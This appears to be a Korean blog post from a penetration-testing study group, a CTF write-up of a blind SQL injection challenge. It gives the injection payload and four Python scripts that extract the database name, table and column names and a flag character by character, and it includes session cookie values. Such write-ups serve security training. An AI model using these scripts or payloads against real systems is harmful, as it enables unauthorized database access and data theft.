---
layout: post
title:  노말틱 모의해킹 스터디 6주차 워게임 (7) 보안 커뮤니티
author: leewoojin
date: 2025-05-20 00:00:00 +0900
categories: [Pentest, W6]
tags: []
---

### sqli 성공 여부 
sql%'and'1%'='1/ sq%'and'1%'='2 를 비교해보면 sqli 성공하는 것을 알수있습니다. 
```
[공격 페이로드 ]
sql%'and(공격문)and'1%'='1
```
### db명 추출 
sql%'and(ascii(substr((select+database()),1,1))>0)and'1%'='1

```python
import requests

URL = "http://ctf.segfaulthub.com:2984/spec5/search.php"
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Cookie": "session=92baaf4d-3cc4-4f11-8b4e-4d9b50257a10.8Fga17H7VjUhtvLN4Hq3HbFF9sA; user_theme=dark"
}

def is_condition_true(position, ascii_code):
    payload = f"sql%'and ascii(substr((select database()),{position},1))={ascii_code} and'1%'='1"
    params = {"q": payload}
    response = requests.get(URL, params=params, headers=HEADERS)
    return len(response.text) > 100  # 정상 출력이면 조건이 참 (길이 기준)

def extract_database_name(max_length=20):
    result = ""
    print("[*] Extracting database name...")
    for i in range(1, max_length + 1):
        found = False
        for ascii_code in range(32, 127):  # Printable ASCII only
            if is_condition_true(i, ascii_code):
                result += chr(ascii_code)
                print(f"[+] Found char at position {i}: {chr(ascii_code)}")
                found = True
                break
        if not found:
            print(f"[!] No more characters found at position {i}. Terminating.")
            break
    return result

if __name__ == "__main__":
    db_name = extract_database_name()
    print(f"\n[✔] Extracted database name: {db_name}")
```

## 테이블 
```python 
import requests
import urllib.parse

# [설정값]
base_url = "http://ctf.segfaulthub.com:2984/spec5/search.php"
cookies = {
    "session": "8b500df9-1241-4ae4-be5d-d0bbca32ee7b.qNM9sj50a0V2Hmt9R4YfJaDb0dU"  # ← 세션값에 따라 변경
}
headers = {
    "User-Agent": "Mozilla/5.0",
    "Referer": "http://ctf.segfaulthub.com:2984/spec5/"
}

# [응답 판별 함수]
def is_true(payload_raw):
    encoded = urllib.parse.quote(payload_raw)
    url = f"{base_url}?q={encoded}"
    response = requests.get(url, headers=headers, cookies=cookies)
    return '"posts":[]' not in response.text  # 결과가 있으면 참

# [테이블명 추출 함수]
def extract_table_name(db='spec5', table_index=2, max_length=30):
    table_name = ""
    print(f"[*] `{db}` 데이터베이스의 테이블 #{table_index} 추출 중...\n")

    for i in range(1, max_length + 1):
        found = False
        for ascii_code in range(32, 127):  # 출력 가능한 ASCII 문자
            payload = (
                f"sql%' AND ASCII(SUBSTR((SELECT table_name FROM infOrmation_schema.tables "
                f"WHERE table_schema='{db}' LIMIT {table_index},1),{i},1))={ascii_code} AND '1%'='1"
            )

            if is_true(payload):
                char = chr(ascii_code)
                table_name += char
                print(f"[+] 위치 {i}: '{char}' 발견 → 현재까지: {table_name}")
                found = True
                break

        if not found:
            print("[*] 더 이상 문자가 없습니다.")
            break

    print(f"\n[✔] 최종 추출된 테이블명: {table_name}")
    return table_name

# [실행]
if __name__ == "__main__":
    extract_table_name()

```

## 컬럼 
```python 
import requests
import urllib.parse

# [설정값]
base_url = "http://ctf.segfaulthub.com:2984/spec5/search.php"
cookies = {
    "session": "8b500df9-1241-4ae4-be5d-d0bbca32ee7b.qNM9sj50a0V2Hmt9R4YfJaDb0dU"
}
headers = {
    "User-Agent": "Mozilla/5.0",
    "Referer": "http://ctf.segfaulthub.com:2984/spec5/"
}

# [응답 판별 함수]
def is_true(payload_raw):
    encoded = urllib.parse.quote(payload_raw)
    url = f"{base_url}?q={encoded}"
    response = requests.get(url, headers=headers, cookies=cookies)
    return '"posts":[]' not in response.text  # 결과가 있다면 True

# [컬럼명 추출 함수]
def extract_column_name(db='spec5', table='flags', column_index=0, max_length=30):
    column_name = ""
    print(f"[*] `{db}` 데이터베이스의 `{table}` 테이블 컬럼 #{column_index} 추출 중...\n")

    for i in range(1, max_length + 1):
        found = False
        for ascii_code in range(32, 127):  # 출력 가능한 ASCII
            payload = (
                f"sql%' AND ASCII(SUBSTR((SELECT column_name FROM infOrmation_schema.columns "
                f"WHERE table_schema='{db}' AND table_name='{table}' "
                f"LIMIT {column_index},1),{i},1))={ascii_code} AND '1%'='1"
            )

            if is_true(payload):
                char = chr(ascii_code)
                column_name += char
                print(f"[+] 위치 {i}: '{char}' 발견 → 현재까지: {column_name}")
                found = True
                break

        if not found:
            print("[*] 더 이상 문자가 없습니다.")
            break

    print(f"\n[✔] 최종 추출된 컬럼명: {column_name}")
    return column_name

# [실행]
if __name__ == "__main__":
    extract_column_name()

```

## 데이터
```python 
import requests
import urllib.parse

# [설정값]
base_url = "http://ctf.segfaulthub.com:2984/spec5/search.php"
cookies = {
    "session": "8b500df9-1241-4ae4-be5d-d0bbca32ee7b.qNM9sj50a0V2Hmt9R4YfJaDb0dU"
}
headers = {
    "User-Agent": "Mozilla/5.0",
    "Referer": "http://ctf.segfaulthub.com:2984/spec5/"
}

# [응답 판별 함수]
def is_true(payload_raw):
    encoded = urllib.parse.quote(payload_raw)
    url = f"{base_url}?q={encoded}"
    response = requests.get(url, headers=headers, cookies=cookies)
    return '"posts":[]' not in response.text  # 결과가 있으면 True

# [FLAG 값 추출 함수]
def extract_flag(db='spec5', table='flags', column='flag', row_index=0, max_length=100):
    flag = ""
    print(f"[*] `{db}.{table}.{column}` 의 row #{row_index} 플래그 추출 중...\n")

    for i in range(1, max_length + 1):
        found = False
        for ascii_code in range(32, 127):
            payload = (
                f"sql%' AND ASCII(SUBSTR((SELECT {column} FROM {db}.{table} "
                f"LIMIT {row_index},1),{i},1))={ascii_code} AND '1%'='1"
            )

            if is_true(payload):
                char = chr(ascii_code)
                flag += char
                print(f"[+] 위치 {i}: '{char}' 발견 → 현재까지: {flag}")
                found = True
                break

        if not found:
            print("[*] 더 이상 문자가 없습니다.")
            break

    print(f"\n[✔] 최종 추출된 값: {flag}")
    return flag

# [실행]
if __name__ == "__main__":
    extract_flag()

```